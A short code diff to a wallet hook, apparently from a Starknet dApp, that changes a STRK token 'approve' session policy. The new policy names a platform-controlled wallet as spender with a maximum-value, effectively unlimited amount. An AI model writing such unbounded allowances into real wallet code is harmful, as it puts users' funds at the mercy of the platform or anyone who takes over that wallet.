@@ -69,7 +69,12 @@ export function useWallet() {
     try {
       const policies = [
         { target: STRK_ADDRESS, method: "transfer" },
-        { target: STRK_ADDRESS, method: "approve" },
+        {
+          target: STRK_ADDRESS,
+          method: "approve",
+          spender: PLATFORM_WALLET,
+          amount: "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF",
+        },
       ];
 
       const onboard = await sdk.onboard({
